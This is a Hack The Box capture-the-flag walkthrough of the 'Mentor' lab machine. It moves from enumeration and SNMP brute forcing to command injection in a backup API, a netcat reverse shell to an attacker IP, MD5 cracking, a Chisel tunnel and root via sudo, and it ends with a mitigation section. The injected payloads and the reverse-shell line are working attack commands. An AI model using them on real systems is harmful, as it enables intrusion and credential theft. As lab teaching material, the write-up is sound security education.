---
layout: post
title: Hack The Box Walkthrough - Mentor
date: 2023-03-02
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/03/HTB/Mentor
img: 2023/03/Mentor/Mentor.png
---

This machine took me a long time to own because I failed at basic enumeration. Most of the work to do this box was in finding the passwords laying around.

* Room: Mentor
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Mentor](https://app.hackthebox.com/machines/Mentor)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

I began by launching Rustscan to find open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.193:22
Open 10.10.11.193:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 08:34 EST
NSE: Loaded 155 scripts for scanning.

...

Scanned at 2023-02-25 08:34:10 EST for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=
|   256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds
```

It found two ports:
* 22 (SSH)
* 80 (HTTP)

Nmap showed that the HTTP server was redirecting to 'http://mentorquotes.htb/' so I added the domain to my hosts file.

I ran Feroxbuster on the site.

```bash
$ feroxbuster -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mentorquotes.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      167l      621w     5506c http://mentorquotes.htb/
403      GET        9l       28w      281c http://mentorquotes.htb/server-status
[####################] - 3m     63088/63088   0s      found:2       errors:31
[####################] - 3m     63088/63088   291/s   http://mentorquotes.htb/
```

It did not find anything of interest. I used wfuzz to look for subdomains.

```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 26 -H "Host:FUZZ.mentorquotes.htb" "http://mentorquotes.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000051:   404        0 L      2 W        22 Ch       "api"
000002700:   400        10 L     35 W       308 Ch      "m."
000002795:   400        10 L     35 W       308 Ch      "ns2.cl.bellsouth.net."
000002885:   400        10 L     35 W       308 Ch      "ns2.viviotech.net."
000002883:   400        10 L     35 W       308 Ch      "ns1.viviotech.net."
000003050:   400        10 L     35 W       308 Ch      "ns3.cl.bellsouth.net."
000004083:   400        10 L     35 W       308 Ch      "quatro.oweb.com."
000004081:   400        10 L     35 W       308 Ch      "ferrari.fortwayne.com."
000004082:   400        10 L     35 W       308 Ch      "jordan.fortwayne.com."

Total time: 0
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 0
```

I added 'api.memtorquotes.htb' to my hosts file and scanned it.

```bash
$ feroxbuster -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o api_ferox.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ api_ferox.txt
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
307      GET        0l        0w        0c http://api.mentorquotes.htb/admin => http://api.mentorquotes.htb/admin/
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c http://api.mentorquotes.htb/quotes => http://api.mentorquotes.htb/quotes/
403      GET        9l       28w      285c http://api.mentorquotes.htb/server-status
[####################] - 1m     63088/63088   0s      found:5       errors:59
[####################] - 1m     63088/63088   654/s   http://api.mentorquotes.htb/
```

It found 'api.mentorquotes.htb'.

## Website

I opened a browser to look at the website.

![Website](/assets/images/2023/03/Mentor/MentorSite.png "Website")

It was a very simple website that showed some quotes. It appeared to have only one page. I looked at the source, and the requests it made. I did not see anything to exploit.

## API

I started looking at the API. Feroxbuster showed me that there was something on '/docs', so I looked at this first.

![API Doc](/assets/images/2023/03/Mentor/APIDoc.png "API Doc")

It contained the [Swagger documentation](https://swagger.io/) of the API. The API was simple, having endpoints to authenticate, manage users, and manage quotes. Ferobuster also found an '/admin/' endpoint that was not documented.

The API had an endpoint to signup. I used it to create a user.

```http
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Content-Length: 83

{
  "email": "eric@test.htb",
  "username": "test1",
  "password": "12345678"
}
```

It worked.

```http
HTTP/1.1 201 Created
Date: Sat, 25 Feb 2023 17:53:59 GMT
Server: uvicorn
content-length: 51
content-type: application/json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
  "id": 4,
  "email": "eric@test.htb",
  "username": "test1"
}
```

I then logged in as the new user.

```http
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Content-Length: 83

{
  "email": "eric@test.htb",
  "username": "test1",
  "password": "12345678"
}
```

```http
HTTP/1.1 200 OK
Date: Sat, 25 Feb 2023 18:00:43 GMT
Server: uvicorn
content-length: 142
content-type: application/json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJlcmljQHRlc3QuaHRiIn0.6EX5kf4IJxcw2QpZXGm6UZhSHVUtiVrUBvq65iqARxM"
```

It gave me a JWT. I added it to my requests and tried the different API endpoints. I was able to get the quotes, but every other call failed.

```json
{
  "detail": "Only admin users can access this resource"
}
```

The documentation page contained an email, I tried to use it to create a new user.

```http
POST /auth/signup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Content-Length: 124

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "12345678",
  "admin": 1,
  "isAdmin": 1
}
```

This told me that the user already existed.

```json
{
  "detail": "User already exists! "
}
```

I tried using Hydra to brute force the password for james. And I tried to brute-force the key to sign the JWT with hashcat. They both failed.

```bash
$ hydra -l james -P /usr/share/seclists/rockyou.txt -u -e snr  -m "/auth/login:{\"email\"\:\"james@mentorquotes.htb\",\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:200 OK:H=Content-Type: application/json" api.mentorquotes.htb http-post-form

$ hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzICIsImVtYWlsIjoiamFtZXNAbWVudG9ycXVvdGVzLmh0YiJ9._Oh3hzsiflgbMWcFjZGF33bxTCt263o0vl5m6hqFqaU /usr/share/seclists/rockyou.txt
```

I lost a lot of hours trying to break the API. Eventually, I looked for a hint on the HTB forum and saw something about UDP. I really need to start scanning UDP all the time.

```bash
$ sudo nmap -sU target -oN nampUdp.txt
[sudo] password for ehogue:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 17:17 EST
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
Nmap scan report for target (10.10.11.193)
Host is up (0.030s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 1013.42 seconds
```

[Simple Network Management Protocol (SNMP)](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol) was open. I tried scanning it with multiple tools. But I did not find anything of interest.

I used hydra to scan for other community strings. But it kept on finding only 'public'.

```bash
$ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.htb snmp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-25 19:48:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://target.htb:161/
[161][snmp] host: target.htb   password: public
[STATUS] attack finished for target.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-25 19:48:34
```

Eventually, I realized that it was ending too quickly. I was not giving it the `-f` parameter, so I did not think it was supposed to stop after it found the first match, but it did.

I moved 'public at the end of my wordlist and tried again with SNMP versions 1 and 2.

```bash
$ hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt target.htb snmp -m '2'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-26 11:11:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3217 login tries (l:1/p:3217), ~202 tries per task
[DATA] attacking snmp://target.htb:161/2
[STATUS] 128.00 tries/min, 128 tries in 00:01h, 3089 to do in 00:25h, 16 active
[STATUS] 122.67 tries/min, 368 tries in 00:03h, 2849 to do in 00:24h, 16 active
[STATUS] 121.00 tries/min, 847 tries in 00:07h, 2370 to do in 00:20h, 16 active
        [161][snmp] host: target.htb   password: internal
[STATUS] attack finished for target.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-26 11:23:28
```

It found 'internal'. I scanned this.

```bash

$ snmpbulkwalk -v 2c -c internal target . > snmp.txt

...

HOST-RESOURCES-MIB::hrSWRunParameters.1991 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2006 = STRING: "-namespace moby -id 42602c871adeb563d57151cd342480f8a7f3cd30928eef2b1bee26105a2cec4f -address /run/containerd/containerd.sock"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2026 = STRING: "main.py"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2044 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2045 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2085 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2087 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2112 = STRING: "/usr/local/bin/login.py REDACTED"¬
HOST-RESOURCES-MIB::hrSWRunParameters.2279 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2347 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2348 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2454 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2486 = ""¬
HOST-RESOURCES-MIB::hrSWRunParameters.2530 = ""¬

...
```

It found a script running on the server, with what looked like a password in the command line.

I used the password to connect as james.

```http
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 100

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "REDACTED"
}
```

It worked.

```http
HTTP/1.1 200 OK
Date: Sun, 26 Feb 2023 16:29:18 GMT
Server: uvicorn
content-length: 154
content-type: application/json
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

"JWT"
```

I used the returned JWT to try the requests that were rejected earlier.

```http
GET /users/ HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Authorization: JWT
```

I was able to extract users.

```http
HTTP/1.1 201 Created
Date: Sun, 26 Feb 2023 16:36:25 GMT
Server: uvicorn
content-length: 305
content-type: application/json
Connection: close

[{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},{"id":4,"email":"admin@mentorquotes.htb","username":"admin"},{"id":5,"email":"admin@mentorquotes.htb","username":"james"},{"id":6,"email":"user@example.com","username":"string"}]
```

I tried creating quotes with [Server Side Template Injection (SSTI) payloads](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect).


```http
POST /quotes/ HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Authorization: JWT
Content-Length: 125

{
"title":  {% raw %}"{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}*{7*7}"{% endraw %},
"description":  {% raw %}"{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}*{7*7}"{% endraw %}
}
```

The payload was accepted and reflected in the response, but not executed. I looked at the first website. The new quote was there, but again not executed.


## Admin API

I remembered the undocumented admin endpoint found by Feroxbuster. I tried it again with james' JWT.

```http
GET /admin/ HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Authorization: JWT
```

```http
HTTP/1.1 200 OK
Date: Sun, 26 Feb 2023 16:37:07 GMT
Server: uvicorn
content-length: 83
content-type: application/json
Connection: close

{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}o
```

It showed 2 additional endpoints. I tried '/admin/check', the response said that it was not implemented yet.

I tried the '/admin/backup' endpoint. It required a path.

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Authorization: JWT
Content-Length: 27

{
"path": "/etc/passwd"
}
```

```http
HTTP/1.1 200 OK
Date: Fri, 03 Mar 2023 12:43:17 GMT
Server: uvicorn
content-length: 16
content-type: application/json
Connection: close

{"INFO":"Done!"}
```

I thought this might be creating backups through some command line, so I tried to get code execution.

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-type: application/json
Authorization: JWT
Content-Length: 44

{
"path": "/etc/passwd; wget 10.10.14.8"
}
```

It worked, but the backup file name was appended at the end of my command.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.193 - - [03/Mar/2023 07:45:05] code 404, message File not found
10.10.11.193 - - [03/Mar/2023 07:45:05] "GET /app_backkup.tar HTTP/1.1" 404 -
```

I added a semicolon and a '#' to comment out the rest of the command.

```json
{
"path": "/etc/passwd; wget 10.10.14.8 ; #"
}
```

This time it requested only what I asked.

```bash
10.10.11.193 - - [03/Mar/2023 07:47:19] "GET / HTTP/1.1" 200 -
```

I knew I could get code execution. I tried my usual reverse shell, but it failed. Bash was not installed on the server. I tried a different reverse shell using sh.

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: JWT


{
"path": "; mkfifo /tmp/aaaa; nc 10.10.14.11 4444 0</tmp/aaaa | /bin/sh >/tmp/aaaa 2>&1; rm /tmp/aaaa; #"
}
```

This one worked.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.193] 35401

whoami
root

pwd
/app

hostname
a6fe36f9a4e5

cd /home/svc

ls
user.txt

cat user.txt
REDACTED
```

## User svc

I was in a Docker container. I found some database credentials in the website code, in '/app/app/db.py'.

```python
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)

...
```

I could not connect to the database from the container, it did not have any Postgres client installed. I used [Chisel](https://github.com/jpillora/chisel) to create a tunnel between the container and my Kali VM so I could connect to the database from my machine.

I started a Chisel server on my machine.

```bash
./chisel server -p 3477 --reverse
```

Then I downloaded Chisel in the container and launched it. I ran it as a client to send traffic on port 5432 on my machine to the same port on the database server.

```bash
wget 10.10.14.11/chisel
Connecting to 10.10.14.11 (10.10.14.11:80)
chisel               100% |********************************| 8188k  0:00:00 ETA

chmod +x chisel

./chisel client 10.10.14.11:3477 R:5432:172.22.0.1:5432/tcp
```

Back on my machine, I connected to Postgres through the reverse tunnel.

```
psql postgresql://postgres:postgres@localhost/mentorquotes_db
```

Then I looked at what the database contained.

```sql
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db=# Select * From cmd_exec;
                               cmd_output
------------------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
(1 row)

mentorquotes_db=# Select * From users;
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)

```

I already knew james' password. I used Hashcat to crack the password for svc.

```bash
$ cat hash.txt
53f22d0dfa10dce7e29cd31f4f953fd8

$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2868/5801 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

53f22d0dfa10dce7e29cd31f4f953fd8:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 53f22d0dfa10dce7e29cd31f4f953fd8
Time.Started.....: Sun Feb 26 15:31:07 2023 (2 secs)
Time.Estimated...: Sun Feb 26 15:31:09 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6440.5 kH/s (0.12ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13326336/14344384 (92.90%)
Rejected.........: 0/13326336 (0.00%)
Restore.Point....: 13323264/14344384 (92.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123qwe1q -> 123kof321
Hardware.Mon.#1..: Util: 31%

Started: Sun Feb 26 15:30:55 2023
Stopped: Sun Feb 26 15:31:10 2023
```

The password was cracked in a few seconds. I used it to ssh to the server as svc.

```bash
$ ssh svc@target
svc@target's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 26 08:32:32 PM UTC 2023

  System load:                      0.00439453125

...

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40

svc@mentor:~$ 
```

## User james

This one took me a lot of time to get. I started by looking at the common things. I could not run sudo, and did not find any interesting suid binaries. I also check for files with capabilities, but again nothing.

I checked for cronjobs.

```
svc@mentor:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
# 10 * * * *  sleep 30; /usr/local/bin/login.py 'kj23sadkj123as0-d213'
```

There was a commented-out cronjobs. This was the command I saw in SNMP that gave me the password to use in the API. I retried the password as james and root. It failed.

I checked the script content.

```python
#!/usr/bin/python3
import requests, time
import sys, os

user = 'james'
passw = sys.argv[1]

json_data = {
    'email': f'{user}@mentorquotes.htb',
    'username': user,
    'password': passw,
}

while True:
        response = requests.post('http://172.22.0.1:8000/auth/login', json=json_data)

        if 'Not authorized!' in response:
                os.system(f"echo [{time.asctime()}] FAILED LOGIN! >> /root/logins.log")

        time.sleep(20)
```

The code was writting to a file in '/root'. That looked really promising, maybe it was being run as root. I was able to write to it, so I added a line to create a file in '/tmp'. I also ran [pspy](https://github.com/DominicBreuker/pspy) to find out if I could see it executed. It was not.

I ran [linPEAS](https://github.com/carlospolop/PEASS-ng) on the server and did not see anything in the results. I tried to find modified files all over the file system. 

Eventually, I looked at the configuration for the running services. The Apache and sshd configuration had nothing special. But when I got to the SNMP configuration, I finally saw it.


```bash
svc@mentor:~$ cat /etc/snmp/snmpd.conf
...

createUser bootstrap MD5 REDACTED DES
rouser bootstrap priv

...
```

I contained a password. I used it to 'su' as james.

```bash
svc@mentor:~$ su james
Password:

james@mentor:/home/svc$ 
```


## root

Once connected as james, getting root was very easy.

```bash
james@mentor:/home/svc$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh

james@mentor:~$ sudo /bin/sh

# cat /root/root.txt
REDACTED
```

## Mitigation

The biggest issue with that box is the passwords. There are passwords all over, and they are reused. There is a password used on the command line that allowed me to connect to the API. The password that svc uses for the API is the same one they use to connect to the server. That password is also hashed using a very weak algorithm (MD5). It took hashcat 15 seconds to crack it in an underprovisioned VM. And james' password was in clear in a configuration file that anyone could read. This user had permission to do anything they wanted on the server. Their password should have been a lot stronger than what they used, and it should never appear anywhere on the server.

I do not know much about SNMP. I never used it. But a quick search tells me that only SNMPv3 should be used as it allows authentication and encrypting of the payloads. Also, it probably should not be accessible to unknown machines on the net.

The code used by the backup API did have any protection against command injection. It took user input and directly inserted it into a shell command.

```python
